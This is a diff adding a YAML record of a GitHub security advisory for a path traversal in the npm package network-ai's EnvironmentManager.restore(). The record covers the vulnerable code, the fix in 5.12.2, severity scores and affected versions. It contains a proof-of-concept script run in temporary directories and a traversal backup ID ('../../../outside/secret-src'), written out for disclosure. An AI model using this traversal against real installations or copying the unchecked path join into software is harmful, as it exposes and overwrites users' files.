@@ -1,0 +1,300 @@
+advisory_id: GHSA-48x2-6pr9-2jjf
+datasource_id: github_osv/GHSA-48x2-6pr9-2jjf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-48x2-6pr9-2jjf/GHSA-48x2-6pr9-2jjf.json
+aliases: []
+summary: |
+  Network-AI: EnvironmentManager.restore() backup ID path traversal copies arbitrary directories into environment data
+  ### Summary
+  `EnvironmentManager.restore(env, backupId)` computes the backup path with `join(envDir, '.backups', backupId)` and only checks that this path exists. It does not resolve the result or verify that it remains under `data/<env>/.backups`.
+
+  A caller can pass a traversal backup ID such as `../../../outside/source-dir` to restore files from an arbitrary directory into the target environment data directory. Confirmed in Network-AI 5.12.1.
+
+  ### Details
+  `restore()` builds `backupPath` directly from caller-controlled `backupId`:
+
+  ```ts
+  restore(env: EnvName, backupId: string): RestoreResult {
+    const envDir = this.getDataDir(env);
+    const backupsDir = join(envDir, '.backups');
+    const backupPath = join(backupsDir, backupId);
+
+    if (!existsSync(backupPath)) {
+      throw new Error(`Backup '${backupId}' not found for environment '${env}'`);
+    }
+
+    this.backup(env);
+
+    const files = this._collectBackupFiles(backupPath);
+    let restored = 0;
+    for (const rel of files) {
+      if (rel === '_manifest.json') continue;
+      const src = join(backupPath, rel);
+      const dst = join(envDir, rel);
+      try {
+        mkdirSync(join(envDir, rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '.'), { recursive: true });
+        copyFileSync(src, dst);
+        restored++;
+      } catch { /* skip */ }
+    }
+
+    return { backupId, env, filesRestored: restored };
+  }
+  ```
+
+  There is no resolved containment check that ensures `backupPath` remains under `backupsDir`.
+
+  Default CLI reachability exists through `network-ai env backup restore --env <env> --backup <id>`.
+
+  Affected source evidence:
+
+  - `lib/env-manager.ts:474-499` — vulnerable restore path construction and copy.
+  - `bin/cli.ts:441-458` — default CLI exposes restore with caller-controlled `--backup`.
+
+  ### PoC
+  This PoC uses only temporary directories and restores `trust_levels.json` from an external directory into `data/dev`:
+
+  ```bash
+  TMP=$(mktemp -d)
+  TMPBASE="$TMP" node -r ts-node/register/transpile-only - <<'TS'
+  const { EnvironmentManager } = require('./lib/env-manager');
+  const fs = require('fs');
+  const path = require('path');
+  const base = process.env.TMPBASE;
+  const data = path.join(base, 'data');
+  const source = path.join(base, 'outside', 'secret-src');
+
+  fs.mkdirSync(source, { recursive: true });
+  fs.writeFileSync(path.join(source, 'trust_levels.json'), '{"leaked":true}');
+
+  const mgr = new EnvironmentManager(data, {
+    chain: ['dev', 'st'],
+    gates: { dev: 'auto', st: 'auto' },
+  });
+
+  mgr.init('dev');
+  const backupId = path.relative(path.join(data, 'dev', '.backups'), source);
+  const result = mgr.restore('dev', backupId);
+  const restored = fs.readFileSync(path.join(data, 'dev', 'trust_levels.json'), 'utf8');
+
+  console.log(JSON.stringify({ backupId, filesRestored: result.filesRestored, restored }, null, 2));
+  fs.rmSync(base, { recursive: true, force: true });
+  TS
+  ```
+
+  Observed result includes `backupId: "../../../outside/secret-src"`, `filesRestored: 1`, and restored content `{"leaked":true}`.
+
+  ### Impact
+  A caller that can invoke backup restore can copy arbitrary readable directories into `data/<env>`, subject to process filesystem permissions. This can stage sensitive files into environment data/backup locations, overwrite environment configuration files if matching filenames exist, and break environment isolation. No RCE chain was confirmed.
+
+
+  ---
+
+  ### Resolution (maintainer)
+
+  **Fixed in [v5.12.2](https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2) (commit `a59c13a`).** Install: `npm install network-ai@5.12.2` — published to npm with provenance.
+
+  `restore()` now validates `backupId` against `/^[\w\-]+$/` and asserts `dirname(resolve(join(backupsDir, backupId))) === resolve(backupsDir)` before touching the filesystem. Backup IDs containing path separators or `..` are rejected, so a crafted ID can no longer copy directories from outside `.backups/` into the environment.
+
+  All 3,269 tests pass against the patched build. Thanks to @sondt99 for the responsible disclosure.
+impacted_packages:
+  - purl: pkg:npm/network-ai
+    affected_versions: vers:npm/<=5.12.1
+    fixed_versions: vers:npm/5.12.2
+    affected_packages:
+      - pkg:npm/network-ai@3.0.0
+      - pkg:npm/network-ai@3.0.1
+      - pkg:npm/network-ai@3.0.2
+      - pkg:npm/network-ai@3.0.3
+      - pkg:npm/network-ai@3.1.0
+      - pkg:npm/network-ai@3.1.2
+      - pkg:npm/network-ai@3.1.3
+      - pkg:npm/network-ai@3.2.0
+      - pkg:npm/network-ai@3.2.1
+      - pkg:npm/network-ai@3.2.2
+      - pkg:npm/network-ai@3.2.3
+      - pkg:npm/network-ai@3.2.4
+      - pkg:npm/network-ai@3.2.5
+      - pkg:npm/network-ai@3.2.6
+      - pkg:npm/network-ai@3.2.7
+      - pkg:npm/network-ai@3.2.8
+      - pkg:npm/network-ai@3.2.9
+      - pkg:npm/network-ai@3.2.10
+      - pkg:npm/network-ai@3.2.11
+      - pkg:npm/network-ai@3.3.0
+      - pkg:npm/network-ai@3.3.1
+      - pkg:npm/network-ai@3.3.2
+      - pkg:npm/network-ai@3.3.3
+      - pkg:npm/network-ai@3.3.4
+      - pkg:npm/network-ai@3.3.5
+      - pkg:npm/network-ai@3.3.6
+      - pkg:npm/network-ai@3.3.7
+      - pkg:npm/network-ai@3.3.8
+      - pkg:npm/network-ai@3.3.9
+      - pkg:npm/network-ai@3.3.10
+      - pkg:npm/network-ai@3.3.11
+      - pkg:npm/network-ai@3.4.0
+      - pkg:npm/network-ai@3.4.1
+      - pkg:npm/network-ai@3.5.0
+      - pkg:npm/network-ai@3.5.1
+      - pkg:npm/network-ai@3.6.0
+      - pkg:npm/network-ai@3.6.2
+      - pkg:npm/network-ai@3.7.0
+      - pkg:npm/network-ai@3.7.1
+      - pkg:npm/network-ai@3.8.0
+      - pkg:npm/network-ai@3.9.0
+      - pkg:npm/network-ai@4.0.0
+      - pkg:npm/network-ai@4.0.1
+      - pkg:npm/network-ai@4.0.2
+      - pkg:npm/network-ai@4.0.3
+      - pkg:npm/network-ai@4.0.4
+      - pkg:npm/network-ai@4.0.5
+      - pkg:npm/network-ai@4.0.6
+      - pkg:npm/network-ai@4.0.7
+      - pkg:npm/network-ai@4.0.8
+      - pkg:npm/network-ai@4.0.9
+      - pkg:npm/network-ai@4.0.10
+      - pkg:npm/network-ai@4.0.11
+      - pkg:npm/network-ai@4.0.12
+      - pkg:npm/network-ai@4.0.13
+      - pkg:npm/network-ai@4.0.14
+      - pkg:npm/network-ai@4.0.15
+      - pkg:npm/network-ai@4.0.16
+      - pkg:npm/network-ai@4.0.17
+      - pkg:npm/network-ai@4.1.0
+      - pkg:npm/network-ai@4.2.0
+      - pkg:npm/network-ai@4.3.0
+      - pkg:npm/network-ai@4.3.1
+      - pkg:npm/network-ai@4.3.2
+      - pkg:npm/network-ai@4.3.3
+      - pkg:npm/network-ai@4.3.4
+      - pkg:npm/network-ai@4.3.5
+      - pkg:npm/network-ai@4.3.6
+      - pkg:npm/network-ai@4.3.7
+      - pkg:npm/network-ai@4.4.0
+      - pkg:npm/network-ai@4.4.1
+      - pkg:npm/network-ai@4.4.2
+      - pkg:npm/network-ai@4.4.3
+      - pkg:npm/network-ai@4.5.0
+      - pkg:npm/network-ai@4.5.1
+      - pkg:npm/network-ai@4.5.2
+      - pkg:npm/network-ai@4.5.3
+      - pkg:npm/network-ai@4.6.0
+      - pkg:npm/network-ai@4.6.1
+      - pkg:npm/network-ai@4.6.2
+      - pkg:npm/network-ai@4.7.0
+      - pkg:npm/network-ai@4.7.1
+      - pkg:npm/network-ai@4.8.0
+      - pkg:npm/network-ai@4.8.1
+      - pkg:npm/network-ai@4.9.0
+      - pkg:npm/network-ai@4.9.1
+      - pkg:npm/network-ai@4.10.0
+      - pkg:npm/network-ai@4.10.1
+      - pkg:npm/network-ai@4.10.2
+      - pkg:npm/network-ai@4.10.3
+      - pkg:npm/network-ai@4.10.4
+      - pkg:npm/network-ai@4.10.5
+      - pkg:npm/network-ai@4.11.0
+      - pkg:npm/network-ai@4.11.1
+      - pkg:npm/network-ai@4.11.2
+      - pkg:npm/network-ai@4.12.0
+      - pkg:npm/network-ai@4.12.1
+      - pkg:npm/network-ai@4.13.0
+      - pkg:npm/network-ai@4.13.1
+      - pkg:npm/network-ai@4.14.0
+      - pkg:npm/network-ai@4.15.0
+      - pkg:npm/network-ai@4.15.1
+      - pkg:npm/network-ai@4.15.2
+      - pkg:npm/network-ai@4.15.3
+      - pkg:npm/network-ai@5.0.0
+      - pkg:npm/network-ai@5.1.0
+      - pkg:npm/network-ai@5.1.1
+      - pkg:npm/network-ai@5.1.2
+      - pkg:npm/network-ai@5.1.3
+      - pkg:npm/network-ai@5.1.4
+      - pkg:npm/network-ai@5.2.0
+      - pkg:npm/network-ai@5.2.1
+      - pkg:npm/network-ai@5.2.2
+      - pkg:npm/network-ai@5.3.0
+      - pkg:npm/network-ai@5.3.1
+      - pkg:npm/network-ai@5.3.2
+      - pkg:npm/network-ai@5.4.0
+      - pkg:npm/network-ai@5.4.1
+      - pkg:npm/network-ai@5.4.2
+      - pkg:npm/network-ai@5.4.3
+      - pkg:npm/network-ai@5.4.4
+      - pkg:npm/network-ai@5.4.5
+      - pkg:npm/network-ai@5.5.0
+      - pkg:npm/network-ai@5.5.1
+      - pkg:npm/network-ai@5.5.2
+      - pkg:npm/network-ai@5.5.3
+      - pkg:npm/network-ai@5.5.4
+      - pkg:npm/network-ai@5.5.5
+      - pkg:npm/network-ai@5.5.6
+      - pkg:npm/network-ai@5.5.7
+      - pkg:npm/network-ai@5.5.8
+      - pkg:npm/network-ai@5.5.9
+      - pkg:npm/network-ai@5.6.0
+      - pkg:npm/network-ai@5.6.1
+      - pkg:npm/network-ai@5.7.0
+      - pkg:npm/network-ai@5.7.1
+      - pkg:npm/network-ai@5.7.2
+      - pkg:npm/network-ai@5.8.0
+      - pkg:npm/network-ai@5.8.1
+      - pkg:npm/network-ai@5.8.2
+      - pkg:npm/network-ai@5.8.3
+      - pkg:npm/network-ai@5.8.4
+      - pkg:npm/network-ai@5.8.5
+      - pkg:npm/network-ai@5.8.6
+      - pkg:npm/network-ai@5.8.7
+      - pkg:npm/network-ai@5.8.8
+      - pkg:npm/network-ai@5.8.9
+      - pkg:npm/network-ai@5.9.0
+      - pkg:npm/network-ai@5.9.1
+      - pkg:npm/network-ai@5.10.0
+      - pkg:npm/network-ai@5.10.1
+      - pkg:npm/network-ai@5.10.2
+      - pkg:npm/network-ai@5.11.0
+      - pkg:npm/network-ai@5.12.0
+      - pkg:npm/network-ai@5.12.1
+    fixed_packages:
+      - pkg:npm/network-ai@5.12.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/jovancoding/network-ai
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/jovancoding/network-ai
+        commit: a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-48x2-6pr9-2jjf/GHSA-48x2-6pr9-2jjf.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-23
+  - CWE-22
+references:
+  - url: https://github.com/Jovancoding/Network-AI
+    reference_type:
+    reference_id:
+  - url: https://github.com/Jovancoding/Network-AI/commit/a59c13a1f0ce0e8a0779a90343eef92fac5ab4c3
+    reference_type:
+    reference_id:
+  - url: https://github.com/Jovancoding/Network-AI/releases/tag/v5.12.2
+    reference_type:
+    reference_id:
+  - url: https://github.com/Jovancoding/Network-AI/security/advisories/GHSA-48x2-6pr9-2jjf
+    reference_type:
+    reference_id:
+exploits: []
